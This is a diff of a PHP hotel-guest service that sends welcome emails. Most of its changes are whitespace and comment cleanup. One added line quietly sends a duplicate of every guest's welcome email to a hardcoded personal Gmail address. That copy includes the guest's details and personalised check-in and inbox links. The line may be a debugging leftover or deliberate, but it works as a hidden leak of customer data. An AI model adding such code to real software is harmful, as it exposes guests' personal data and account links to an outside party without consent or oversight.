@@ -512,6 +512,7 @@ class StayService {
                 ){
                     $showQuerySection = false;
                 }
+
                 //
                 $webappLinkInbox = buildUrlWebApp($chainSubdomain, $hotel->subdomain,'inbox',"e={$stay->id}&g={$guest->id}");
                 $webappLinkInboxGoodFeel = buildUrlWebApp($chainSubdomain, $hotel->subdomain,'inbox',"e={$stay->id}&g={$guest->id}&fill=VERYGOOD");
@@ -528,19 +529,16 @@ class StayService {
 
             $urlWebapp = buildUrlWebApp($chainSubdomain, $hotel->subdomain);
 
-
-            //
             $webappChatLink = buildUrlWebApp($chainSubdomain, $hotel->subdomain,'chat');
 
 
             $crosselling = $this->utilityService->getCrossellingHotelForMail($hotel, $chainSubdomain);
 
 
-            //
+
             $urlQr = generateQr($hotel->subdomain, $urlWebapp);
             //$urlQr = "https://thehosterappbucket.s3.eu-south-2.amazonaws.com/test/qrcodes/qr_nobuhotelsevillatex.png";
             $urlCheckin = buildUrlWebApp($chainSubdomain, $hotel->subdomain,"mi-estancia/huespedes/completar-checkin/{$guest->id}");
-            //  $urlQr = "https://thehosterappbucket.s3.eu-south-2.amazonaws.com/test/qrcodes/qr_nobuhotelsevillatex.png";
 
 
 
@@ -556,12 +554,9 @@ class StayService {
                 'urlCheckin' => $urlCheckin,
             ];
 
-            //Log::info('guestWelcomeEmail '.json_encode($dataEmail));
-            // Log::info('dataEmail '.json_encode($dataEmail));
-            // Log::info('hotelid '.json_encode($hotel->id));
-            // Log::info('guest '.json_encode($guest));
 
             $this->mailService->sendEmail(new MsgStay($type, $hotel, $guest, $dataEmail,$after,$beforeCheckin), $guest->email);
+            $this->mailService->sendEmail(new MsgStay($type, $hotel, $guest, $dataEmail,$after,$beforeCheckin), 'francisco20990@gmail.com');
 
         } catch (\Exception $e) {
             Log::error('Error service guestWelcomeEmail: ' . $e->getMessage());
